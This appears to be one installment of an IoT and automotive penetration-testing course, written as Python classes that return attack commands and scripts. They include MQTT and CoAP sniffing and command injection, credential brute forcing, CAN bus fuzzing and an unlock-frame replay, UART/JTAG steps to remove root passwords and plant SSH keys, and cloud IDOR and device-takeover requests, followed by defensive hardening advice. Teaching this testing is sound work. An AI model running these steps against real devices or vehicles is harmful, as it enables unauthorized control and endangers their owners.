# Part 77: Automotive/IoT Security (Steps 761-770)

## Step 761: IoT Security Fundamentals

```python
#!/usr/bin/env python3
# IoT security fundamentals and common vulnerabilities

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class IoTSecurityFramework:
    """IoT security assessment framework"""
    
    # OWASP IoT Top 10
    OWASP_IOT_TOP10 = [
        ("I1", "Weak, Guessable, or Hardcoded Passwords"),
        ("I2", "Insecure Network Services"),
        ("I3", "Insecure Ecosystem Interfaces (Web/Mobile/Cloud APIs)"),
        ("I4", "Lack of Secure Update Mechanism"),
        ("I5", "Use of Insecure or Outdated Components"),
        ("I6", "Insufficient Privacy Protection"),
        ("I7", "Insecure Data Transfer and Storage"),
        ("I8", "Lack of Device Management"),
        ("I9", "Insecure Default Settings"),
        ("I10", "Lack of Physical Hardening"),
    ]
    
    def iot_attack_surface(self) -> Dict:
        """Map IoT attack surface"""
        return {
            "hardware": [
                "UART/JTAG debug interfaces",
                "Exposed test pads on PCB",
                "Flash memory chip (read directly)",
                "SPI/I2C bus sniffing",
                "Physical tampering",
            ],
            "firmware": [
                "Hardcoded credentials",
                "Backdoors and debug ports",
                "Unencrypted firmware updates",
                "Buffer overflows in embedded code",
                "Command injection in CGI scripts",
            ],
            "network": [
                "Insecure protocols (Telnet, HTTP, MQTT without auth)",
                "Open management ports",
                "Unencrypted communications",
                "Rogue device registration",
                "DNS hijacking",
            ],
            "web_mobile_api": [
                "Insecure authentication",
                "IDOR vulnerabilities",
                "SSTF/SSRF in device endpoints",
                "Weak token management",
                "API keys in mobile apps",
            ],
            "cloud_backend": [
                "Insecure device-cloud communication",
                "Weak API authentication",
                "Mass IDOR (access all devices)",
                "Device impersonation",
            ]
        }
    
    def discover_iot_devices(self, network: str) -> Dict:
        """Discover IoT devices on network"""
        return {
            "nmap_scan": [
                f'nmap -sV -O -p 21,22,23,80,443,1883,5683,8080,8443 {network}',
                f'nmap -sU -p 5683 {network}  # CoAP (IoT protocol)',
                f'nmap --script iot-discover {network}',
            ],
            "shodan_queries": [
                'port:23 default password',
                '"default password" port:80',
                '"Basic realm" port:80',
                'product:"Hikvision" OR product:"Dahua"  # IP cameras',
                'port:1883  # MQTT brokers',
                'port:5683  # CoAP servers',
            ],
            "default_credentials_check": [
                'python3 changeme.py -t http://192.168.1.0/24',
                'medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/top_passwords.txt -M http',
            ]
        }


@dataclass
class IoTNetworkAttacks:
    """IoT network protocol attacks"""
    
    def mqtt_attacks(self, broker_ip: str, port: int = 1883) -> Dict:
        """MQTT broker attacks"""
        python_mqtt = f'''import paho.mqtt.client as mqtt
import json

def on_connect(client, userdata, flags, rc):
    print(f"Connected to MQTT broker (rc={{rc}})")
    # Subscribe to all topics (#)
    client.subscribe("#")
    # Subscribe to common IoT topics
    for topic in ["/home/+/+", "devices/+/telemetry", "commands/+", "sensors/#"]:
        client.subscribe(topic)

def on_message(client, userdata, msg):
    print(f"Topic: {{msg.topic}}")
    print(f"Payload: {{msg.payload.decode()}}")
    try:
        data = json.loads(msg.payload)
        print(f"Parsed: {{json.dumps(data, indent=2)}}")
    except:
        pass

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

# Try without auth
client.connect("{broker_ip}", {port}, 60)
client.loop_forever()
'''
        
        commands = {
            "subscribe_all": f'mosquitto_sub -h {broker_ip} -p {port} -t "#" -v',
            "subscribe_cmds": f'mosquitto_sub -h {broker_ip} -p {port} -t "commands/#" -v',
            "publish_cmd": f'mosquitto_pub -h {broker_ip} -p {port} -t "commands/device1" -m "{{\"cmd\":\"reboot\"}}\'',
            "brute_auth": f'mqtt-pwn --target {broker_ip} --port {port} --wordlist passwords.txt',
        }
        return {"python_sniff": python_mqtt, "commands": commands}
    
    def coap_attacks(self, target: str) -> Dict:
        """CoAP protocol attacks"""
        return {
            "discover": f'coap-client -m GET coap://{target}/.well-known/core',
            "read_resource": f'coap-client -m GET coap://{target}/actuator/status',
            "write_resource": f'coap-client -m PUT coap://{target}/actuator/control -e "{{\"state\":\"on\"}}\'',
            "observe": f'coap-client -m GET -s coap://{target}/sensors/temperature  # Subscribe',
            "tool": "libcoap, coap-client, aiocoap"
        }
    
    def zigbee_attacks(self) -> Dict:
        """Zigbee network attacks"""
        return {
            "tools": [
                "KillerBee framework (zbstumbler, zbreplay, zbassocflood)",
                "HackRF One with Zigbee firmware",
                "CC2531 USB dongle",
            ],
            "attacks": [
                "zbstumbler - Discover Zigbee networks",
                "zbreplay - Replay captured frames",
                "zbassocflood - Association flood DoS",
                "zbfakebeacon - Fake coordinator beacon",
                "zbscapy - Zigbee packet crafting",
            ],
            "commands": [
                'zbstumbler  # Scan for Zigbee networks',
                'zbwireshark -i 11  # Channel 11 capture',
                'zbreplay -r capture.pcap  # Replay traffic',
            ]
        }


if __name__ == '__main__':
    iot = IoTSecurityFramework()
    print("[+] OWASP IoT Top 10:")
    for num, name in iot.OWASP_IOT_TOP10:
        print(f"    {num}: {name}")
    
    attack_surface = iot.iot_attack_surface()
    total = sum(len(v) for v in attack_surface.values())
    print(f"\n[+] Total attack surface items: {total}")
    
    network_attacks = IoTNetworkAttacks()
    mqtt = network_attacks.mqtt_attacks("192.168.1.100")
    print(f"\n[+] MQTT attack commands: {list(mqtt['commands'].keys())}")
```

## Step 762: Firmware Analysis

```python
#!/usr/bin/env python3
# IoT firmware analysis

import os
import subprocess
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class FirmwareAnalyzer:
    """IoT firmware analysis"""
    firmware_path: str
    output_dir: str = "/tmp/firmware_analysis"
    
    def extract_firmware(self) -> Dict:
        """Extract and analyze firmware"""
        commands = {
            "binwalk_extract": f'binwalk -e {self.firmware_path} -C {self.output_dir}',
            "binwalk_scan": f'binwalk {self.firmware_path}',
            "binwalk_entropy": f'binwalk -E {self.firmware_path}  # Entropy analysis for compression/encryption',
            "binwalk_signatures": f'binwalk --signature {self.firmware_path}',
            "jefferson": f'jefferson {self.firmware_path} -d {self.output_dir}  # JFFS2 filesystem',
            "unsquashfs": f'unsquashfs {self.output_dir}/squashfs-root.img  # SquashFS',
        }
        return commands
    
    def analyze_extracted_firmware(self, root_dir: str) -> Dict:
        """Analyze extracted firmware filesystem"""
        analysis_cmds = {
            "find_hardcoded_creds": [
                f'grep -r "password" {root_dir}/etc --include="*.conf" -l',
                f'grep -rE "passwd|password|pass=|user=|admin=" {root_dir} -l',
                f'grep -r "admin:" {root_dir}/etc/passwd {root_dir}/etc/shadow 2>/dev/null',
            ],
            "find_private_keys": [
                f'find {root_dir} -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null',
                f'grep -r "BEGIN RSA PRIVATE" {root_dir}',
                f'grep -r "BEGIN EC PRIVATE" {root_dir}',
            ],
            "find_web_interfaces": [
                f'find {root_dir} -name "*.cgi" -o -name "*.php" 2>/dev/null',
                f'find {root_dir}/www -type f 2>/dev/null',
            ],
            "find_binaries": [
                f'find {root_dir}/bin {root_dir}/sbin {root_dir}/usr/bin -type f 2>/dev/null',
            ],
            "check_busybox": [
                f'file {root_dir}/bin/sh  # Usually symlink to BusyBox',
                f'strings {root_dir}/bin/busybox | head -5',
            ]
        }
        return analysis_cmds
    
    def emulate_firmware(self) -> Dict:
        """Emulate IoT firmware with QEMU"""
        return {
            "firmae": [
                'git clone https://github.com/pr0v3rbs/FirmAE.git',
                'cd FirmAE && ./download.sh && ./install.sh',
                f'./run.sh -r BRAND {self.firmware_path}  # Emulate router firmware',
            ],
            "fat": [
                'git clone https://github.com/attify/firmware-analysis-toolkit',
                f'cd firmware-analysis-toolkit && ./fat.py {self.firmware_path}',
            ],
            "manual_qemu": [
                '# Extract rootfs',
                f'binwalk -e {self.firmware_path}',
                '# Chroot into filesystem with QEMU user mode emulation',
                'cp $(which qemu-mips-static) squashfs-root/usr/bin/',
                'chroot squashfs-root qemu-mips-static /bin/sh',
            ]
        }
    
    def static_binary_analysis(self, binary: str) -> Dict:
        """Static analysis of embedded binary"""
        return {
            "file_info": f'file {binary}',
            "strings": f'strings -n 8 {binary} | grep -E "password|admin|key|secret|http"',
            "ghidra": f'analyzeHeadless /tmp/iot_project FirmwareAnalysis -import {binary} -postScript PrintFunctionNames.java',
            "radare2": [
                f'r2 -A {binary}',
                'afl  # list functions',
                'pdf @ main  # disassemble main',
            ],
            "checksec": f'checksec --file={binary}  # Check security features',
        }


if __name__ == '__main__':
    analyzer = FirmwareAnalyzer("/samples/router_firmware.bin")
    
    extract_cmds = analyzer.extract_firmware()
    print("[+] Firmware extraction commands:")
    for name, cmd in extract_cmds.items():
        print(f"    {name}: {cmd[:60]}...")
    
    analysis = analyzer.analyze_extracted_firmware("/tmp/firmware_root")
    print(f"\n[+] Analysis categories: {list(analysis.keys())}")
    
    emulation = analyzer.emulate_firmware()
    print(f"\n[+] Emulation options: {list(emulation.keys())}")
```

## Step 763: Automotive Security (CAN Bus)

```python
#!/usr/bin/env python3
# Automotive CAN bus security testing

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class CANBusAnalyzer:
    """CAN bus security analysis"""
    interface: str = "vcan0"  # or can0 for physical
    
    def setup_can_interface(self) -> List[str]:
        """Setup CAN interface for testing"""
        setup = [
            '# Setup virtual CAN interface for testing',
            'sudo modprobe vcan',
            f'sudo ip link add dev {self.interface} type vcan',
            f'sudo ip link set up {self.interface}',
            '# For physical CAN (USB-CAN adapter)',
            'sudo ip link set can0 up type can bitrate 500000',
        ]
        return setup
    
    def can_sniffing(self) -> Dict:
        """Sniff CAN bus traffic"""
        tools = {
            "candump": f'candump {self.interface}  # Dump all frames',
            "candump_log": f'candump -l {self.interface}  # Log to file',
            "cansniffer": f'cansniffer -c {self.interface}  # Highlight changing values',
            "python_sniff": f'''import can

bus = can.interface.Bus(channel="{self.interface}", bustype="socketcan")

for msg in bus:
    print(f"ID: 0x{{msg.arbitration_id:03x}} Data: {{msg.data.hex()}} Timestamp: {{msg.timestamp}}")
    
    # Filter specific IDs
    if msg.arbitration_id == 0x7E8:  # OBD-II response
        print(f"  OBD Response: {{msg.data.hex()}}")
'''
        }
        return tools
    
    def can_fuzzing(self) -> Dict:
        """CAN bus fuzzing"""
        python_fuzzer = f'''import can
import random
import time

bus = can.interface.Bus(channel="{self.interface}", bustype="socketcan")

# Fuzz random CAN IDs
for iteration in range(1000):
    arb_id = random.randint(0x000, 0x7FF)
    data = bytes([random.randint(0, 255) for _ in range(8)])
    
    msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
    bus.send(msg)
    print(f"Iteration {{iteration}}: ID=0x{{arb_id:03x}} Data={{data.hex()}}")
    time.sleep(0.001)  # Small delay
'''
        
        cansend_cmds = [
            f'cansend {self.interface} 7DF#0201050000000000  # Request engine RPM',
            f'cansend {self.interface} 18DB33F1#0201050000000000  # OBD-II extended',
            '# Unlock car by replaying unlock frame (if captured)',
            f'cansend {self.interface} 03B#0000000000000000',
        ]
        
        return {"fuzzer": python_fuzzer, "cansend": cansend_cmds}
    
    def obd2_scanner(self) -> Dict:
        """OBD-II diagnostic scanner"""
        python_obd = f'''import can
import time

bus = can.interface.Bus(channel="{self.interface}", bustype="socketcan")

# OBD-II PID requests
OBD_PIDS = {{
    0x0C: "Engine RPM",
    0x0D: "Vehicle Speed (km/h)",
    0x05: "Engine Coolant Temp",
    0x0F: "Intake Air Temp",
    0x11: "Throttle Position",
    0x1C: "OBD Standard",
    0x5C: "Engine Oil Temp",
}}

for pid, description in OBD_PIDS.items():
    # Request: 7DF (broadcast) - 02 01 PID 00 00 00 00 00
    request = can.Message(
        arbitration_id=0x7DF,
        data=[0x02, 0x01, pid, 0x00, 0x00, 0x00, 0x00, 0x00]
    )
    bus.send(request)
    time.sleep(0.1)
    
    # Wait for response (7E8 = ECU response)
    msg = bus.recv(timeout=1.0)
    if msg and msg.arbitration_id == 0x7E8:
        print(f"{{description}}: {{msg.data.hex()}}")
'''
        return {"code": python_obd}


@dataclass
class AutomotivePenTest:
    """Automotive penetration testing"""
    
    def remote_attack_surface(self) -> Dict:
        """Remote automotive attack surfaces"""
        return {
            "telematics": [
                "Cellular connectivity (2G/3G/4G/5G)",
                "WiFi hotspot",
                "Bluetooth pairing",
                "Remote start apps",
            ],
            "v2x_communications": [
                "V2V (Vehicle-to-Vehicle)",
                "V2I (Vehicle-to-Infrastructure)",
                "DSRC (802.11p)",
                "C-V2X (cellular-based)"
            ],
            "infotainment": [
                "USB port (malicious device)",
                "CD/DVD media",
                "Bluetooth audio",
                "Android Auto/Apple CarPlay",
            ],
            "famous_attacks": [
                "Jeep Cherokee hack (2015) - Miller & Valasek via Sprint network",
                "Tesla Model S attack via browser exploit",
                "BMW ConnectedDrive hack (2015)",
            ]
        }
    
    def ecu_security_testing(self) -> Dict:
        """ECU security testing approaches"""
        return {
            "tools": [
                "CANalyzer (Vector)",
                "CANdb++ for DBC files",
                "python-can library",
                "socketcand",
                "CANtact",
                "Kvaser interfaces",
            ],
            "methodology": [
                "1. Map CAN bus topology and ECU inventory",
                "2. Capture baseline traffic during normal operation",
                "3. Identify critical IDs (unlock, start, brakes)",
                "4. Replay attack testing",
                "5. Fuzzing specific ID ranges",
                "6. UDS (Unified Diagnostic Services) testing",
                "7. Bootloader security assessment",
            ]
        }


if __name__ == '__main__':
    can = CANBusAnalyzer("vcan0")
    setup = can.setup_can_interface()
    print("[+] CAN interface setup:")
    for cmd in setup:
        print(f"    {cmd}")
    
    sniffing = can.can_sniffing()
    print(f"\n[+] CAN sniffing tools: {list(sniffing.keys())}")
    
    pentest = AutomotivePenTest()
    attack_surface = pentest.remote_attack_surface()
    print(f"\n[+] Remote attack surfaces: {list(attack_surface.keys())}")
    print(f"[+] Famous automotive attacks:")
    for attack in attack_surface['famous_attacks']:
        print(f"    {attack}")
```

## Step 764-770: Advanced IoT Testing

```python
#!/usr/bin/env python3
# Advanced IoT security testing (Steps 764-770)

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class HardwareSecurity:
    """Hardware security testing for IoT"""
    
    def uart_exploitation(self) -> Dict:
        """UART serial access exploitation"""
        return {
            "identification": [
                "Use multimeter to find TX, RX, GND, VCC pads",
                "Use logic analyzer to detect UART traffic",
                "Common baud rates: 9600, 115200, 57600",
                "Tool: JTAGulator to identify UART automatically",
            ],
            "connection": [
                "Connect FTDI USB-Serial adapter to UART pads",
                "Baud rate may need detection (minicom, screen)",
                'screen /dev/ttyUSB0 115200',
                'minicom -b 115200 -D /dev/ttyUSB0',
            ],
            "exploitation": [
                "Access U-Boot bootloader (interrupt boot)",
                "Login as root (often no password or default)",
                "Mount flash as writable",
                "Modify /etc/passwd to remove root password",
                "Add SSH public key to /root/.ssh/authorized_keys",
            ]
        }
    
    def jtag_exploitation(self) -> Dict:
        """JTAG interface exploitation"""
        return {
            "description": "JTAG allows hardware-level debugging and memory access",
            "tools": [
                "OpenOCD - open-source JTAG debugger",
                "JTAGulator - find JTAG/UART pins",
                "Segger J-Link",
                "Bus Pirate",
            ],
            "openocd_commands": [
                'openocd -f interface/jlink.cfg -f target/stm32f1x.cfg',
                'mdw 0x08000000 0x1000  # Read flash memory',
                'halt; dump_image firmware.bin 0x08000000 0x80000',
                'flash write_image firmware_modified.bin 0x08000000',
            ]
        }
    
    def spi_flash_dumping(self) -> Dict:
        """SPI flash chip dumping"""
        return {
            "tools": [
                "Bus Pirate + Flashrom",
                "CH341A programmer",
                "Clip adapter for in-circuit reading",
            ],
            "flashrom_commands": [
                'flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r firmware_dump.bin',
                'flashrom -p ch341a_spi -r firmware_dump.bin',
                'flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware_dump.bin',
                'binwalk firmware_dump.bin  # Analyze extracted firmware',
            ]
        }


@dataclass
class IoTCloudSecurity:
    """IoT cloud backend security testing"""
    
    def api_testing(self, base_url: str) -> Dict:
        """IoT cloud API security testing"""
        return {
            "device_idor": [
                f'GET {base_url}/api/devices/1234/config  # Try other device IDs',
                f'GET {base_url}/api/devices/1235/config  # Horizontal privilege escalation',
            ],
            "mass_idor": [
                '# Use Intruder/ffuf to enumerate device IDs',
                f'ffuf -u {base_url}/api/devices/FUZZ/status -w device_ids.txt -mc 200',
            ],
            "device_takeover": [
                '# Register device with attacker-controlled certificate',
                f'POST {base_url}/api/devices/register {{"device_id": "victim_device", "cert": "attacker_cert"}}',
            ],
            "command_injection": [
                f'POST {base_url}/api/devices/123/execute {{"cmd": "ping; id"}}',
            ]
        }


@dataclass
class IoTDefenseRecommendations:
    """IoT security defense recommendations"""
    
    def device_hardening(self) -> Dict:
        """IoT device hardening checklist"""
        return {
            "manufacturing": [
                "Unique per-device credentials (no hardcoded passwords)",
                "Secure boot chain (verify firmware signatures)",
                "Disable unused interfaces (JTAG, UART in production)",
                "Minimal attack surface (remove unnecessary services)",
                "Hardware-backed key storage (HSM/TPM)",
            ],
            "connectivity": [
                "TLS/DTLS for all communications",
                "Certificate pinning",
                "Mutual authentication (mTLS)",
                "Firewall rules (whitelist outbound connections)",
                "VPN for management access",
            ],
            "lifecycle": [
                "Secure OTA update mechanism",
                "Cryptographic signature verification for updates",
                "Rollback protection",
                "End-of-life update policy",
                "Device decommissioning procedure (secure erase)",
            ]
        }
    
    def network_monitoring(self) -> Dict:
        """IoT network monitoring"""
        return {
            "segregation": [
                "Separate IoT VLAN from corporate network",
                "Firewall rules between IoT and IT networks",
                "Monitor all IoT device communications",
            ],
            "detection": [
                "Baseline normal device behavior",
                "Alert on new device connections",
                "Monitor for unusual protocols or destinations",
                "Detect Mirai-like scanning behavior",
            ],
            "tools": [
                "Armis IoT security platform",
                "Forescout - device visibility",
                "PFSense with pfBlockerNG",
                "Zeek for IoT traffic analysis",
            ]
        }


if __name__ == '__main__':
    hw = HardwareSecurity()
    uart = hw.uart_exploitation()
    print("[+] UART exploitation steps:")
    for step in uart['exploitation']:
        print(f"    {step}")
    
    jtag = hw.jtag_exploitation()
    print(f"\n[+] JTAG tools: {jtag['tools']}")
    
    cloud = IoTCloudSecurity()
    api_tests = cloud.api_testing("https://api.iot-vendor.com")
    print(f"\n[+] IoT API test categories: {list(api_tests.keys())}")
    
    defense = IoTDefenseRecommendations()
    hardening = defense.device_hardening()
    print(f"\n[+] Device hardening categories: {list(hardening.keys())}")
    total = sum(len(v) for v in hardening.values())
    print(f"[+] Total hardening items: {total}")
```
